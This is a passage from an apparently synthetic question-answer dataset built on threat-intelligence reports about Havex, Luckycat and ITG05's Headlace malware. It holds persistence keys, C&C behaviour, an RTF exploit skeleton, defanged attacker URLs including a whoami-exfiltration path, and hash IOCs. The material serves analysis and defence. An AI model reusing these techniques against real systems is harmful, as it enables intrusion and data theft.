044: Use an asymmetric crypto algorithm (RSA) to decrypt the downloaded binaries. (Previous versions use simple XOR based encryption).\nVersions 020 \u2013 025: Check the Internet connection by trying to connect to google.com:\nCONNECT google.com:80 HTTP/1.0\nCollect system information, write it to *.yls file. Later, append these contents to the POST request string.\n\u2022 Collected information includes:\n\u2022 Unique system ID\n\u2022 OS\n\u2022 Username\n\u2022 Computer name\n\u2022 Country\n\u2022 Language\n\u2022 Current IP\n\u2022 List of drives\n\u2022 Default Browser\n\u2022 Running Processes\n\u2022 Proxy Setting\n\u2022 User Agent\n\u2022 Email Name\n\u2022 BIOS version and date\n\u2022 Lists of files and folders (non-recursive) from the following paths:\nC:\\Documents and Settings\\%User%\\Desktop\\*.*\nC:\\Documents and Settings\\%User%\\My Documents\\*.*\nC:\\Documents and Settings\\%User%\\My Documents\\Downloads\\*.*\nC: \\Documents and Settings\\%User%\\My Documents\\My Music\\*.*\nC: \\Documents and Settings\\%User%\\My Documents\\My Pictures\\*.*\nC:\\Program Files\\*.*\nRoot directory of all fixed and removable drives.\nVersion 025: Contains a debugging symbols path, which may suggest that the project was internally called \"PhalangX\":\nd:\\Workspace\\PhalangX 3D\\Src\\Build\\Release\\Phalanx-3d.ServerAgent.pdb\nVersion 038 \u2013 040: Does not contain the routine that collects system info, yet the malware checks for potential previously created *.yls files, and appends the content of them to the POST request. Instead of values hardcoded in the binary, this is a first version to use a resource to store encrypted config. Detailed analysis of this version is included in this appendix.\nVersion 043 \u2013 044: Size similar to 037 and earlier versions; dll name is now 0XX.dll (where XX is version number), the <unk> value in config is now 29 bytes long.\nFeatures common across multiple versions\nEXPORTS:\nRunDllEntry, runDll (all versions)\nINJECT TO:\nExplorer.EXE (all versions)\nREG VALUES CREATED:\n[HKLM|HKCU]\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\"TMP provider\" = \"rundll32 %TEMP%\\TMPprovider0XX.dll, runDll\"\n[HKLM|HKCU]\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\n\"fertger\" = <id>(all versions)\nFILES CREATED:\n<path>\\TMPprovider0XX.dll (versions <= 040)\n%TEMP%\\*.xmd (all versions)\n%TEMP%\\*.yls (ver 01A - 044)\n%TEMP%\\qln.dbx (ver 038 - 044)\nPIPES:\n\\\\.\\pipe\\mypype-f0XX (ver 01 - 025)\n\\\\.\\pipe\\mypype-g0X (ver 01 & 02)\n\\\\.\\pipe\\mypipe-f0XX (ver 029 - 038)\n\\\\.\\pipe\\mypipe-h0XX (ver 029 - 038)\nSTRINGS:\n(all versions)\nq=\n\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)\nAppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36\nSafari/525.19\"\n(ver 01 - 030)\nhavex\n1312312\n(ver 0F, 012, 014, 018)\nPhalanx-3d.Agent.dll\n(ver 01A - 038)\nUser\nPassword\nBUTTON\n(ver 01B - 030)\nAATXn+MiwLu+xCoMG7SqY1uQxAk1qLdyoED9LxIVQr2Z/gsrHIsgTvK9AusdFo+9fzAxf1zXj42880+kUmktmVb 5HSYi8T27Q54eQ4ZLUFKPKZstgHcwPVHGdwpmmRmk09fL3KGd9SqR60Mv7QtJ4VwGDqrzOja+Ml4SI7e60C4qDQ\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAB (ver 029 - 038)\nw1RWs6ejexm8wgqEpulkkESs9xmLQoiY8j/ldzNJ/fPj9t+taxYg6Vo0WgP0u0Me82TuCMxmU+Pcj44c8zP5xOe v4F097r5+saRutxj/Lmnr2AIgDqfM14GNHBQxmRQ3v0Swz6A+5zaMIqQX/13dWF1seQtKysvPQmIoPjvy648= (ver 020 - 025)\n2003\nVista\nUserName\nComputerName\nControl Panel\\International\\\nsCountry\nCountry\nsLanguage\nLanguage\nControl Panel\\International\\Geo\\\nNation\nNot connected\nDial-up\nLAN Connection\nInetInfo\nCurrentIP\n- Removable\n- Fixed\n- Remote\n- CDROM\n- Ramdisk\nDrive\nhttp\\shell\\open\\command\n.exe\nDefaultBrowser\nListProcess\ndata64\nHARDWARE\\DESCRIPTION\\System\nBiosReg\nDesktop\nMyDocs\nProgFiles\nCONNECT google.com:80 HTTP/1.0\nProxy-Authorization:Basic\ngoogle.com\nGET / HTTP/1.1\nHost: google.com\n(ver 025)\nPhalanx-3d.ServerAgent.dll\n\"d:\\Workspace\\PhalangX 3D\\Src\\Build\\Release\\Phalanx-3d.ServerAgent.pdb\"\n(ver 029 & 030)\n5265882854508EFCF958F979E4\n(ver 024, 029 - 038)\n&v1=\n&v2=\n(ver 037 & 038)\nMTMxMjMxMg==\n(ver 038 - 044)\n21f34\n(ver 043 - 044)\n04X.dll (instead of TmpPorvider0XX.dll)\nC2 communication\nDownloadable modules\nMain characteristics:\n\u2022 DLL files that collect assorted information\n\u2022 Downloaded by the main Havex module\n\u2022 Stored in %TEMP%\\*xmd files in an encrypted form\n\u2022 Decrypted and executed by Havex loader\n\u2022 Each module contains config stored as a resource\n\u2022 Config data is compressed with bzip2 and xored with a constant value 1312312, which is hardcoded in the binary in base64 form\n\u2022 Config data includes 29-byte UID, 344-byte encryption key and sometimes some other info (like nk2 file path in case of outlook module)\n\u2022 Most of them write harvested data into the %TEMP%\\*.yls files, which are then sent to the C2 by the main Havex DLL\n\u2022 Data written to *.yls files is compressed with bzip2 and encrypted with the key from the config\n\u2022 Encryption used for log encryption is 3DES. Each analyzed module contains the string: \"Copyright (c) J.S.A.Kapp 1994 - 1996.\" which is related to R_STDLIB.C file (platform-specific C library routines for RSAEURO crypto library)\nOPC modules\nDetailed analysis\nAll currently known samples are completely identical in terms of code and differ only in the content of the resource.\nCode flow:\n\u2022 Decrypt config\nConfig consists of RSA ID (29 bytes) and RSA key (1024 bit) and is stored inside resource TYU 0215 (bzip compressed and xored with \"1312312\")\n29 39ee448cf196304cfe9c6b1c2e436\n344 AATFfxXmUZl/j8JBAwHkk8BcwTIKDcex+0GQp/V9EX4nt64NGsGsTXFhuorwjKCRt6Av3v+hB+gT9mAP9kqY 3TnN1x+MUHaoib1dw8SG9mW5YL+JNu3Kwud/bYGu916U/EGh8PFGruVE2PHXD8EII710gKm00lyi5+Ehjn5C SLLPKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAQAB\n\u2022 Create lock file in %TEMP%\\{rand}.tmp (empty)\n\u2022 Create debug log in %TEMP%\\{rand}.tmp.dat\nProgramm was started at %02i:%02i:%02i\n%02i:%02i:%02i.%04i:\n**************************************************************************\nStart finging of LAN hosts...\nFinding was fault. Unexpective error\nWas found %i hosts in LAN:\nHosts was't found.\nStart finging of OPC Servers...\nWas found %i OPC Servers.\n%i) [<comp_name>\\<ProgID>]\nOPC version support: <[+|-][+|-][+|-]>\nOPC Servers not found. Programm finished\nThread %02i return error code: <error_code>\nStart finging of OPC Tags...\n%i)[%s\\%s]\nSaved in 'OPCServer%02i.txt'\n%i)[%s] (not aviable)\nThread %02i was terminated by ThreadManager(2)\nThread %02i running...\nThread %02i finished.\n\u2022 Look for LAN resources using Windows Networking COM objects:\nWNetOpenEnumW\nWNetEnumResource\n\u2022 For each resource found, create a thread which checks if it's an OPC server & gets detailed OPC information using the following interfaces:\nand writes collected info to the OPCServer<nr>.txt file:\n%s  <%s> (Type=%i, Access=%i, ID='%s')\nOPC Server[%s\\%s] v%i.%i(b%i)\n\nWhat are the primary characteristics of the downloadable modules used by the HAVEX malware, and how do they communicate with the C2 server?",
    "output": "The downloadable modules used by the HAVEX malware are DLL files that collect various types of information. They are downloaded by the main Havex module, stored in %TEMP%\\*xmd files in an encrypted form, and then decrypted and executed by the Havex loader. Each module contains a config stored as a resource, which is compressed with bzip2 and XORed with a constant value '1312312'. The config data includes a 29-byte UID, a 344-byte encryption key, and sometimes additional information. Most modules write harvested data into %TEMP%\\*.yls files, which are then sent to the C2 server by the main Havex DLL. The data written to *.yls files is compressed with bzip2 and encrypted with a 3DES key from the config.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What factors contributed to the rise in ransomware attacks on businesses in 2015, and what was a notable development in this area?",
    "output": "The rise in ransomware attacks on businesses in 2015 was driven by two primary factors: the potential for larger ransoms from organizations compared to individual users, and the higher likelihood that businesses would pay the ransom to restore critical operations. A notable development in this area was the emergence of the first Linux encryption malware, which targeted websites, including online stores. This malware exploited vulnerabilities in web applications to encrypt server data, disrupting website functionality and demanding a ransom of one bitcoin for restoration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Diversity of targets\nThe Luckycat campaign, which has been active since at least June 2011, has been linked to 90 attacks against targets in Japan and India as well as Tibetan activists. Each malware attack involves a unique campaign code that can be used to track which victims were compromised by which malware attack. This illustrates that the attackers are both very aggressive and continually target their intended victims. These are not smash-and-grab attacks but constitute a \"campaign\" comprising a series of ongoing attacks over time. In sum, the Luckycat campaign managed to compromise 233 computers.4\n1\n2 Targeted attacks can sometimes be conducted through instant messages instead of emails.\n3\n4 This number represents the unique MAC addresses of the victims that were stored by the attackers on their C&C infrastructure.\nMedium Headline: Diversity of Malware\nWe were able to identify five malware families either utilized by or hosted on the same dedicated server the Luckycat campaign uses. Some were used as second-stage malware that the attackers pushed to victims whose networks were compromised by first-stage malware. Second-stage malware typically provide additional functionality and are especially used if the first-stage malware prove very simplistic. In addition, we found that the attackers used multiple malware families that coincide with malware that have been used in other campaigns. This indicates a level of collaboration across campaigns.\nMedium Headline: Diversity of infrastructure\nThe Luckycat campaign use free web-hosting services that provide a diversity of domain names as well as IP addresses. This distributes the campaign, making it more difficult to track. However, the attackers also made use of Virtual Private Servers (VPSs) that not only housed their primary malware\u2014TROJ_WIMMIE, but others as well.5 These servers may also act as anchors, as servers on free hosting services are shut down for malicious activity. As a result, the campaign stabilized its infrastructure over time, transferring victims, often through the use of second-stage malware, from free hosting servers to their stable core of VPSs.\nMedium Headline: operations\nTROJ_WIMMIE, favored by the Luckycat attackers, bundles a significant amount of information on the victim and uploads it to a C&C server. One such file recovered from a C&C server is actually the result of a test run by the attackers. The information reveals that the attackers use proxy and anonymity tools to shield their identities as well as a variety of mailing programs to instigate targeted attacks. In addition, the language settings of the attackers' computers indicate that they are Chinese speakers. This is consistent with the information Symantec obtained, which shows that the attackers logged in to their C&C server from IP addresses allocated to China.\nMedium Headline: attribution\nUsing open source research, we were able to connect the email address used to register one of the Luckycat C&C servers to a hacker in the Chinese underground community. He uses the nickname, \"dang0102,\" and has published posts in the famous hacker forum, XFocus, as well as recruited others to join a research project on network attack and defense at the Information Security Institute of the Sichuan University. The hacker, also known as \"scuhkr,\" has authored articles related to backdoors and shellcode in a hacking magazine.\n5 VPSs are dedicated hosting services that can be purchased online.\nBig Headline: LUCKYCAT\nThe malware used in the Luckycat campaign, detected by Trend Micro as TROJ_WIMMIE6 or VBS_WIMMIE,7 connects to a C&C server via HTTP over port 80. It is notable because it uses Windows Management Instrumentation (WMI)8 to establish persistence.9 VBS_WIMMIE registers a script that works as a backdoor to the WMI event handler and deletes files associated with it or TROJ_WIMMIE. As a result, the backdoor cannot be detected by antivirus software through simple file scanning.\nThe compromised computer posts data to a PHP script that runs on the C&C server, usually count.php.\nThe initial communication results in the creation of a file on the C&C server that contains information on the compromised computer. Although the file is empty, the file name contains the hostname of the compromised computer, followed by its MAC address, along with the campaign code the attackers use to identify which malware attack caused the compromise:\nThe attacker then creates a file with a name that ends in @.c, which contains a command.\nThe compromised computer then downloads the file and executes the specified command, which may include any of the following:\n\u2022 Get external IP address\n\u2022 Download file\n\u2022 Execute shell command\n\u2022 Upload file\nThe compromised computer then sends the output to the C&C server and deletes the command file:\nOne of the common initial commands instructs the compromised computer to upload the results of information-gathering commands. This command causes the compromised computer to create a directory listing of the available drives, along with the output of the commands, \"ipconfig,\" \"tasklist,\" and \"systeminfo.\" The resulting files are compressed using the CAB compression format and uploaded to the C&C server. This provides the attackers a full set of information to evaluate the nature of the compromised computer.\n6\n7\n8 The Luckycat malware may be notable but its technique is no longer new, as the WMI malware featured in the paper cited below also exhibited the same capability.\n9\nMedium Headline: exaMples of luckycat attacks\nExample 1: Japan\nA targeted email was sent to some organizations in Japan. One of the attacks occurred during the confusion after the Great East Japan Earthquake and the Fukushima Nuclear Power Plant accident. The attackers used the disaster to lure potential victims into opening a malicious .PDF attachment. The .PDF file exploited a vulnerability in Adobe Reader\u2014CVE-2010-2883, in order to drop TROJ_WIMMIE onto the target's system.10 This malware communicated with a Luckycat C&C server. The decoy document contains the radiation dose measurement results, which were published on the Tokyo Power Electric Company (TEPCO) website.11\nExample 2: India\nA malicious document containing information on India's ballistic missile defense program was used to lure potential victims into opening it. This document contains malicious code that exploits a vulnerability in Microsoft Office\u2014CVE-2010-3333, to drop TROJ_WIMMIE onto a compromised system so this would connect to a C&C server the Luckycat hackers operate.12\n10\n11\n12\nExample 3: Tibet\nMalicious emails and .DOC attachments that leverage Tibetan themes in order to trick recipients into opening them have been found. This particular sample exploits the same vulnerability in Microsoft Office\u2014CVE-2010-3333, to drop TROJ_WIMMIE onto the target's system so it would communicate back to a C&C server the Luckycat hackers operate.\nBig Headline: VULNERABILITIES AND MALWARE SAMPLES\nMost of the samples we have seen exploited CVE-2010-3333. Dubbed the \"Rich Text Format (RTF) Stack Buffer Overflow Vulnerability,\" this causes a buffer overflow in the Microsoft Word RTF parser when the \"pFragments\" shape property is given a malformed value.\nTo verify the exploitation, one should look out for the following keywords:\n\u2022 pFragments: Seen after the string, \"\\sn\"\n\u2022 \\sv: Exploit code is seen after this\nThe typical structure of the malicious RTF document is:\n{\\rtf1{\\shp{\\sp{\\sn pFragments}{\\sv \"exploit code\"}}}}\nThe rest of the samples we found exploited the following vulnerabilities in Adobe Reader and Flash Player:\n\u2022 CVE-2010-2883: Adobe Reader TTF SING table parsing vulnerability\n\u2022 CVE-2010-3654: Adobe Flash Player AVM2 multi-name button class vulnerability13\n\u2022 CVE-2011-0611: Adobe Flash Player AVM1 shared object type vulnerability14\n\u2022 CVE-2011-2462: Adobe Reader U3D component vulnerability15\n13\n14\n15\nBig Headline: CAMPAIGN CODES\nEach malware attack involves a unique campaign code that can be used to track which systems were compromised by which attack. The campaign codes often contain dates that indicate when each malware attack was launched. This demonstrates how actively and frequently the attackers launched attacks. The campaign codes also reveal the attackers' intent, as some of these referenced the intended targets. The following lists the campaign codes we discovered:\n\u2022 0607e\n\u2022 0609af\n\u2022 0613deliinfo\n\u2022 0613f\n\u2022 0614senior\n\u2022 0616itiT8\n\u2022 0706gggg\n\u2022 0804ggggdatanet1\n\u2022 0805ggggetp\n\u2022 0805ggggstp\n\u2022 0805ecil\n\u2022 0805gggg\n\u2022 0818ICG\n\u2022 0823ggggARDE\n\u2022 0824ggg\n\u2022 0826ggggtnd\n\u2022 1017navydiwali\n\u2022 1017ggg\n\u2022 1025gggCSC\n\u2022 1025gggSC\n\u2022 1090silver89\n\u2022 110228cl\n\u2022 110311cl\n\u2022 110315cl\n\u2022 110315\n\u2022 110321cl\n\u2022 110329\n\u2022 110504\n\u2022 110603p89\n\u2022 110606rg789\n\u2022 110616np\n\u2022 110705hktq\n\u2022 110706gggg\n\u2022 110706hal\n\u2022 110705hktq\n\u2022 110708hktqw\n\u2022 110711gggg\n\u2022 110711hal\n\u2022 110711xzg\n\u2022 110713jp\n\u2022 110714jdap\n\u2022 110714tp\n\u2022 110715x\n\u2022 110718p\n\u2022 110816h\n\u2022 110824p\n\u2022 1108navyeast\n\u2022 1108vpsecretary\n\u2022 111031pp\n\u2022 1110mea\n\u2022 1114round\n\u2022 1122bol\n\u2022 1122gmail\n\u2022 1122other\n\u2022 11421is9\n\u2022 1145j9yb\n\u2022 1147s9\n\u2022 1148dq8\n\u2022 11614lmpn\n\u2022 11725imp\n\u2022 11727p\n\u2022 1229\n\u2022 2012\n\u2022 214\n\u2022 28\n\u2022 64sc109pfye\n\u2022 64sc239pf9010\n\u2022 720halheli\n\u2022 729ggggsenior\n\u2022 919ggggstp\n\u2022 ggggstpdomainserver\n\u2022 dang279wrdye\n\u2022 god\n\u2022 gop\n\u2022 ishan99dfp\n\u2022 j1141ap99\n\u2022 j4611dq9\n\u2022 kondulgml27pfye\n\u2022 longjiao\n\u2022 luck\n\u2022 LY\n\u2022 nec3rd79dfp\n\u2022 nfounrsvan99uc\n\u2022 nne\n\u2022 ongs239pfye\n\u2022 sai\n\u2022 stmlsp211wd\n\u2022 w1229\n\u2022 wwwroot\n\u2022 zz1227\nAnswer this question: How does the Luckycat campaign utilize campaign codes to track compromised systems, and what insights do these codes provide about the attackers\u2019 strategies?",
    "output": "The Luckycat campaign utilizes unique campaign codes for each malware attack to track which systems were compromised by which attack. These campaign codes often contain dates that indicate when each malware attack was launched, demonstrating the frequency and activity of the attackers. Additionally, some campaign codes reference the intended targets, revealing the attackers' intent and specificity. For example, codes like '0614senior', '1017navydiwali', and '1108navyeast' suggest targeted attacks on senior officials or naval entities. This methodology helps the attackers manage and monitor their ongoing campaigns effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: ITG05 operations leverage Israel-Hamas conflict lures to deliver Headlace malware\nAuthors: Golo M\u00fchr, Claire Zaboeva, Joe Fasulo\nSource: IBM Security Intelligence\nAs of December 2023, IBM X-Force has uncovered multiple lure documents that predominately feature the ongoing Israel-Hamas war to facilitate the delivery of the ITG05 exclusive Headlace backdoor. The newly discovered campaign is directed against targets based in at least 13 nations worldwide and leverages authentic documents created by academic, finance and diplomatic centers. ITG05's infrastructure ensures only targets from a single specific country can receive the malware, indicating the highly targeted nature of the campaign.\nX-Force tracks ITG05 as a likely Russian state-sponsored group consisting of multiple activity clusters, sharing overlaps with industry-identified threat actor groups APT28, UAC-028, Fancy Bear and Forest Blizzard.\nThe contents of each lure contain themes relevant to a unique audience interested in research and policy creation. The nature of the lures suggests activity is directed at entities with direct influence on the allocation of humanitarian aid, primarily those based in Europe. Our discovery includes multiple legitimate documents associated with finance, think tanks, educational organizations and government and nongovernment organizations (NGOs) leveraged as lure materials. These files are featured in larger infection chains associated with the delivery of the ITG05 exclusive backdoor capable of facilitating multiple malicious actions on objectives.\nIt is unclear precisely how many entities were impacted by the campaign, but our analysis indicates that organizations in the following countries were\ntargeted: Hungary, T\u00fcrkiye, Australia, Poland, Belgium, Ukraine, Germany, Azerbaijan, Saudi Arabia, Kazakhstan, Italy, Latvia and Romania. Of note, all but one of the 13 nations featured in the geolocations perimeters for downloading Headlace are members.\nIt is highly likely the compromise of any echelon of global foreign policy centers may aid officials' interests with advanced insight into critical dynamics surrounding the International Community's (IC) approach to competing priorities for security and humanitarian assistance.\nBig Headline: Key Findings\n\u2022 This is the first known use of the Israel-Hamas conflict by ITG05 to conduct campaigns delivering the exclusive Headlace backdoor.\n\u2022 The campaign leverages documents associated with the United Nations, the Bank of Israel, the United States Congressional Research Service, the European Parliament, a Ukrainian think tank and an Azerbaijan-Belarus Intergovernmental Commission.\n\u2022 X-Force observed the deployment of Headlace and secondary payloads to be specifically targeted toward at least 13 nations.\n\u2022 Some of the uncovered lures are contained in a .RAR archive exploiting the CVE-2023-38831 vulnerability, others use DLL-hijacking to run Headlace.\n\u2022 Headlace is a multi-component including a dropper, a VBS launcher and a backdoor using MSEdge in headless mode to continuously download secondary payloads, likely to exfiltrate credentials and sensitive information.\nBig Headline: Analysis: From decoy documents to phishing lures\nPreviously, ITG05 operations featuring the Headlace backdoor were preceded by numerous decoy documents featuring adult themes. However, during the past month, X-Force observed a change in tactic with the threat actor instead also using the decoys as lures to trick users into accessing the attachments. The majority of the uncovered lures feature English-language text except for a Turkish language and a single Russian-language document. The text of each of the decoys contains themes that would likely not appear as alerting to a unique audience interested in research and policy creation. The following is a selection of uncovered lure documents used in conjunction with Headlace:\nMedium Headline: Example lure 1: Letter of invitation to the expert discussion on the Razumkov Centre\nThe earliest uncovered lure document titled \"Letter of invitation to the expert discussion on theRazumkov Centre,\" dates from early September 2023 and was first by Google TAG. It leverages a document uploaded one day preceding the presentation of the legitimate event hosted by the Razumkov Centre in partnership with the United States Agency for International Development (USAID) under the auspices of the USAID/ENGAGE pact. The invitation presents the findings of the paper \"War of Attrition: Comparison of Potentials and Assessment of Prospects\" on current results of the conflict in Ukraine, combat potentials and policy approaches for avoiding stalemate. The campaign is directed at Romania-based targets based on the geolocation of the targeted download.\nFig. 1: Lure document \"Letter of invitation to the expert discussion on the Razumkov Centre\"\nNotably, this lure was contained in a .RAR archive exploiting CVE-2023-38831. If opened with WinRAR versions below 6.23, the exploit causes Headlace to silently execute if a user tries to open the benign PDF file.\nMedium Headline: Example lure 2: SEDE-PV-2023-10-09-1_EN.docx\nUploaded in mid-October 2023, the lure document titled \"SEDEPV-2023-10-09-1_EN.docx\" features the Minutes of the 9 October 2023 meeting of the Subcommittee on Security and Defence of the European Parliament. Included in the adopted agenda is the question of \"The security situation after the attack by Hamas against Israel, exchange of views with the EU's Police Mission for the Palestinian Territories (EUPOLCOPPS) and the EU's Border Assistance Mission in Rafah (EUBAM Rafah).\"\nMedium Headline: Example lure 3: war.docx\nUploaded in early November 2023, the document titled \"war.docx\" features an authentic copy of the Advance Unedited Version of the \"Report of the Special Committee to Investigate Israeli Practices Affecting the Human Rights of the Palestinian People and Other Arabs of the Occupied Territories\" presented at the seventy-eighth session of the General Assembly of the United Nations. The contents feature policy questions and historical context related to the Levant between September 2022 to September 2023, preceding the surprise attacks.\nFig. 3: Lure document \"war.docx\"\nMedium Headline: Example lure 4: Roadmap.docx\nIn mid-November 2023, a 15-page document titled \"roadmap\" was uploaded by multiple Azerbaijan-based users featuring what appears to be the internal mark-up version of a proposed \"Roadmap on the development of cooperation between the Republic of Belarus and the Republic of Azerbaijan until 2025\" associated with the Joint Intergovernmental Commission between the Republic of Azerbaijan and the Republic of Belarus on Economic Cooperation. The document features two lines for signatures of approval by the respective state ministers, followed by a fillable date pre-populated with the year 2023. The document appears to be authentic given the metadata associated with user modifications.\nMedium Headline: Abusing commercial hosting services\nIn September 2023, CERT-UA spear phishing emails containing URLs that led recipients to malicious archives hosted on abused, publicly available, commercial infrastructure; like the Mocky and Mockbin APIs and the Infinityfreeapp service.\nIn early campaigns, the threat actors used the Mockbin service to deliver malicious ZIP files containing decoy images, as well as a .CMD file which was identified as Headlace malware.\nExample URLs:\nhttps://run.mocky[.]io/v3/027fab50-2478-4dd2-962f-bb525b36810d\nhttps://mockbin[.]org/bin/229f6d51-f534-466f-b642-e86811631083/<result_of_whoami>\nLater, in late October through November 2023, X-Force observed a second legitimate service \"infinityfreeapp.com\" used to host malicious payloads.\nIn the same timeframe, CERT-FR malicious activity by APT28 that included the use of Mocky, Mockbin and infinityfreeapp services in attacks targeting French government systems.\nThe threat actor created several subdomains over the course of the campaigns. The phishing URL would contain a unique hardcoded URL parameter \"id\". This ID is necessary to be able to download the lure archive as well as Headlace's secondary payloads and likely allows ITG05 to track infections through all stages. Once a victim visits the URL and passes the browser check, the site redirects to its filedwn.php script using the same \"id\" parameter. This causes the download of a ZIP file, again containing the Headlace payload. Instead of the Mocky service, the Headlace backdoor uses the hardcoded id parameter to download the next payload via a URL calling the hosted execdwn.php file.\nExample URLs:\nhttps://downloadingdoc[.]infinityfreeapp[.]com/?id=61726832-e715-4f79-99e8-1587300c1035\nhttps://downloadingdoc[.]infinityfreeapp[.]com/filedwn.php?id=61726832-e715-4f79-99e8-1587300c103 https://downloadingdoc[.]infinityfreeapp[.]com/execdwn.php?id=61726832-e715-4f79-99e8-1587300c1035\nMedium Headline: Browser checker\nBefore payloads are downloaded from the legitimate staging services, a Javascript-based browser enumeration script verifies the user agent and in some cases the geolocation of the victim. Different versions of the script are used up to three times within a single infection. Infections start with the phishing URL, which redirects to the first download site after a first check. There, the second check takes place, which involves a user agent and geolocation check via the \"https://ipapi[.]co/json\" service (see screenshot below). After a successful lure download, the victim is redirected to www.msn.com.\n\nQuestion: What are the key differences between the previous ITG05 operations featuring the Headlace backdoor and the newly discovered campaign, particularly in terms of lure content and targeting strategy?\n\nAnswer:",
    "output": "Previously, ITG05 operations featuring the Headlace backdoor used numerous decoy documents with adult themes. In contrast, the newly discovered campaign uses authentic documents related to the ongoing Israel-Hamas war and other relevant topics as lures. This shift suggests a more sophisticated targeting strategy aimed at entities interested in research and policy creation, particularly those involved in humanitarian aid allocation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: IOCs\nFile paths\n%APPDATA%\\Microsoft\\Word\\MSWord.exe\n%APPDATA%\\Axpim\\ubfic.exe (random)\n%TEMP%\\ntlm.exe\n%TEMP%\\msvci.dll\n%TEMP%\\msvcp.dll\n%TEMP%\\msvck.dll\n%TEMP%\\msvct.dll\n%TEMP%\\msvci.exe   (64bit)\n%TEMP%\\msvck60.dll (64bit)\n%TEMP%\\msvct60.dll (64bit)\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\dws.exe\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi.exe\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi32.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msk.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msk60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msp.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msp60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\mst.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\mst60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msvci60.dll\n%APPDATA%\\Axpim\\selfdel.bat\n%TEMP%\\xmlupd.bat\npipes\n\\\\.\\pipe\\bc367\n\\\\.\\pipe\\bc31a7\nRegistry paths\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostUpdate -> %TEMP%\\ntlm.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\ntlm.exe\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostUpdate  -> %TEMP%\\svchost.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\svchost.exe\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dwm service  -> %TEMP%\\dwms.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\dwms.exe\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\dwupdate -> %APPDATA%\\Microsoft\\VisualStudio\\11.0\\dws.exe\nBig Headline: SHA1 hashes of all known variants\n0641f22e1b4e15cc23660b2e8bbf42623e997dfb 0af1a6d6c487e78aa252ae2f5921606a8a379206 100241519698bb013f668ff49d3d0d4fdab6a584 14014f810a0c07b6dde48b7a8954b56c409ae7f3 16c6d317fd7c361623c62cf5652a6b7937f58e0a 22c565e2cfb8adadd022b0ec281bb2b6ed62dca2 23ce92fd1d4d2d42389a66869434fb578aa3f539 261a8fc8e0e396298120a7bc15c32a37f3ce5b94 2a9c8639215faf08593f17b930f83757324dfbee 2ad7262ad52320399aa54cd8482c30e7a480bebc 2eb5a075b710155c409e727e7f74fdc3be63b58c 325b1075b4544ecc2c5741a7a06a9df00f0965da 336d5957909487990033a3432d0347be34db044a 368b746daf5448812b231aed67bd795dfb5a605d 38d16c19b54bf2c94e0ad81fca207de062181b31 4880a13c4e1cde0343c233f5e107abf4e3d00664 49f0569886e5e6ba4b32b7f118dc35f9e5916dc2 4eecebf5c9720c8e85347e0dcf55a844a6d01b08 5374b898dbb618aa84d92f7a3e9d166e9e819960 54ac8caeae8046e01301379602041c74ee527dfc 5617c1414cb79411c64883ee72d219d52123fa30 583036a7c9b210508c222c7dfdd9b8321feca7df 58952be65d0ed53490f69f566485c699f246dcc0 5a6b14fad221ab65a086b1ee7c97eb63ff38480e 5aaa055fa5eb9a436ca0e643bf2ada268bcd6f33 5bcc6da122b3aa88c766d80eb7774c2c6e9e25d5 623185a651a1962538141d7ffefdc2f2445a9201 66a7642abaf3d05d5ab14e83dfd52eca0c17acc6 67e9e098c2b39b5847f6cd3aa5a3f86917602f5f 6a2d12adc541c9c5aaa1096d7e59c72c489cdd59 713855aa5680154324bfcbac638aa1c12681e3c3 7674f680fd0c24c222c027976c40ffe1e08c6f2e 7abf407b9a19dd9ee528fa6e5a099ea1c8ba2f98 80091e1b7b4dd404c83a9c54fda9e6951b2689b1 852dc73ca9e6d92b3da96500d27ab44b7f9a4ea4 85c03c6fa5e3803e55a46f17d6981992181de57b 88af035dc34f730c884b5a11c8be666974a1a6eb 88fd1ee6fb78385a1c5e462dd0768bc34b8188a3 8c4dd73cdd48908ddf5039c5a99e719dfd44ff41 8d40a65a2bca1378eb6e009c1842aa0e45ae289e a5359856742d09d1596e5c7fde407856d72046db a9239572afe4fbdfe077a262c9699eb1d22a9c87 